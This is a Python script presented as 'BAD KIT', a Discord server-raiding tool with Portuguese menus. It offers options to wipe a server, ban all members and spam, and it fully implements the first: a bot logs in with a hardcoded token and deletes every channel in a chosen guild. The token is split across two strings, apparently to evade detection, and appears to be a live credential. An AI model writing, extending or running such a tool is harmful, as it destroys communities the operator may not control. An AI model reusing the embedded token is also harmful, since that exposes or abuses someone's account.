import os
import time
import asyncio
import discord

# Cores ANSI
red = "\033[91m"
reset = "\033[0m"

ascii_logo = f"""{red}



                    mm        mm                  
                mmmmmmmmmmmmmmmmmmmm              
              mmmmmmmmmmmmmmmmmmmmmmmm            
            mmmmmmmmmmmmmmmmmmmmmmmmmmmm          
            mmmmmmmmmmmmmmmmmmmmmmmmmmmm          
            mmmmmm    mmmmmmmm    mmmmmm          
            mmmmmm      mmmm      mmmmmm          
          mmmmmmmm      mmmm      mmmmmmmm        
          mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm        
          mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm        
            mmmmmmmm            mmmmmmmm          


{reset}"""

# Token dividido (exemplo, coloque seu token real dividido em 2 strings)
part1 = "MTM5Nzk5MTA4MzMwODM1NTYzOA.GmA3Sa"
part2 = "mMDuadkSbi6MUQFSjQ_FsB6RVGucystfclb2O0"

token = part1 + part2

# Interface inicial
os.system("clear")
print(ascii_logo)
time.sleep(1.5)

print("BAD KIT\n")
time.sleep(1)

print("1 - Apagar servidor")
print("2 - Banir todos")
print("3 - Spam")
print("4 - (em desenvolvimento)")

opcao = input("\nEscolha uma opção: ")

if opcao == "1":
    intents = discord.Intents.all()
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        print(f"\n[✓] Logado como: {client.user}")
        print("\nServidores disponíveis:\n")

        for idx, guild in enumerate(client.guilds, start=1):
            print(f"{idx} - {guild.name}")

        try:
            escolha = int(input("\nDigite o número do servidor a ser APAGADO: ")) - 1
            guild = client.guilds[escolha]
        except:
            print("[X] Escolha inválida.")
            await client.close()
            return

        print(f"\n[!] Você selecionou: {guild.name}")
        conf = input("Deseja apagar?\n1 - Sim\n2 - Não\n> ")

        if conf != "1":
            print("\n[✓] Ação cancelada.")
            await client.close()
            return

        print(f"\n[!] Apagando todos os canais de: {guild.name}...")

        count = 0
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"[+] Canal apagado: {channel.name}")
                count += 1
            except Exception as e:
                print(f"[X] Falha ao apagar {channel.name}: {e}")

        print(f"\n[✔] Total de canais apagados: {count}")
        await client.close()

    asyncio.run(client.start(token))

else:
    print("\n[!] Essa opção ainda está em desenvolvimento.")
